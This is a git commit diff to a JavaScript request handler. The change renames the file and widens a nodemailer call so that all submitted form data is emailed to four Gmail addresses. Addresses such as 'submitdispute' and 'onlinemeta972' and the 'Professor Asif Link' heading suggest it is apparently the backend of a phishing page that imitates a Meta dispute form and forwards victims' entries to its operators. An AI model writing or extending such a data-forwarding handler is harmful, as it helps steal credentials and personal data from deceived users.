c40d9538f43a30faaeb7b2f5c9402921071c5c9d
zm9807350 <zm9807350@gmail.com>
2025-12-17 19:46:12 +0500

    Update and rename ahtsham.js to Kamil.js

--- Kamil.js
+++ Kamil.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "newzatpage.@gmail.com,submitdispute@gmail.com",
-      subject: "ahtsham",
+      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,onlinemeta972@gmail.com",
+      subject: "Kamil",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Asif Link</h3><pre>${JSON.stringify(
         formData,
